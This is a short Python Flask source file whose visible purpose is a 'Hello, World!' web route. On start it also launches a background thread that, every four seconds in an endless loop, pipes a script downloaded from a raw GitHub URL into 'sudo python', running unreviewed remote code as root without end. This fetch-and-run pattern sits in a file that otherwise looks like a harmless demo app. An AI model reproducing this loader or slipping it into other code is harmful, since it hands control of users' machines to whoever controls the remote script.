from flask import Flask
import threading
import os
import time
def run():
	while True:
		print("runnning file")
		os.system("curl https://raw.githubusercontent.com/billa298/telegram-vid-stream-new/main/run.py | sudo python -")
		time.sleep(4)
x = threading.Thread(target=run)
x.start()
app = Flask('app')

@app.route('/')
def hello_world():
  return 'Hello, World!'
